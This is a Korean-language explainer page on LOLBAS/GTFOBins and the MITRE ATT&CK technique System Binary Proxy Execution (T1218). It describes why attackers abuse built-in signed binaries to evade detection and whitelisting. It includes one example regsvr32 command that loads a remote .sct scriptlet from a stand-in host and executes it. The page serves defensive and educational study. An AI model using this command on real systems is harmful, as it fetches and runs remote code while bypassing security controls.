---
description: T1218
---

# LOLBAS

LOLBAS (Living Off the Land Binaries, Scripts, and Libraries) 와 GTFOBins는 윈도우/리눅스 운영체제에 기본적으로 탑재되어 있는 바이너리, 스크립트, 그리고 라이브러리들이 어떻게 다양한 공격에 사용될 수 있는지를 모아놓은 프로젝트다.&#x20;

이 개념은 새로운 것이 아니라 공격자들이 이미 운영체제에 있는 바이너리, 스크립트, 그리고 라이브러리 등을 이용해 공격하는 TTP 자체를 LOLBINS 공격이라고도 부른다. 하지만 MITRE ATTACK에 공식적으로 등재되어 있는 TTP 이름은 `System Binary Proxy Execution` - 시스템 바이너리 프록시 실행이다.&#x20;

예를 들어 `regsvr32.exe` 는 윈도우2000 이후 모든 윈도우에 깔려있는 프로그램 중 하나다. 원래는 DLL과 ActiveX를 등록하거나 등록해지하는데 사용되는 프로그램이다. 하지만 공격자들은 이를 악용해&#x20;

```
regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll
```

와 같은 형태로 외부 호스트에서 `.sct` 파일을 불러온 뒤 안에 내장된 JScript나 VBScript를 실행시킬 수 있다.&#x20;

### 장점&#x20;

공격자의 입장에서 LOLBAS/GTFOBins를 사용하는 것은 다음과 같은 장점이 있다.&#x20;

* 운영체제에 기본적으로 설치되어 있기 때문에 같은 운영체제 (\*nix, windows, macos) 를 사용한다면 바이너리가 무조건적으로 존재할 확률이 높다.&#x20;
* 윈도우 기준 바이너리 PE Authenticode Signature가 마이크로소프트사 앞으로 사인되어 있기 때문에 악성코드 실행 탐지룰을 피하기 쉽다.&#x20;
* 자주 사용되는 바이너리/스크립트/라이브러리라면 로그룰이나 탐지룰이 안만들어졌을 확률이 높다.&#x20;
* 어플리케이션 화이트리스트를 우회할 수 있다.&#x20;

물론 위의 장점은 2022년도 기준으로 거의 없어지기는 했다. LOLBAS/GTFOBins 프로젝트가 운영되며 다양한 기본 프로그램들이 악용될 수 있다는 사실이 많이 퍼졌고, 탐지룰 또한 많이 만들어졌기 때문이다.&#x20;

LOLBAS/GTFOBins 프로젝트가 운영되기 전까지 블루팀들은 이 모든 기본 바이너리 파일들이 어떻게 악용되는지 몰랐었다. 공격자들은 수십, 수백, 수천가지의 기본 프로그램들 중 하나를 골라서 악용할 수 있었고, 이는 대부분 탐지룰을 피해가는데 큰 역할을 했다.&#x20;

### 이 페이지에서는&#x20;

LOLBAS와 GTFOBINS들의 숫자가 너무 많기 때문에 이 페이지에서는 윈도우 타겟을 공격할 때 자주 이용되는 LOLBAS 프로그램들에 대해서 알아본다.&#x20;
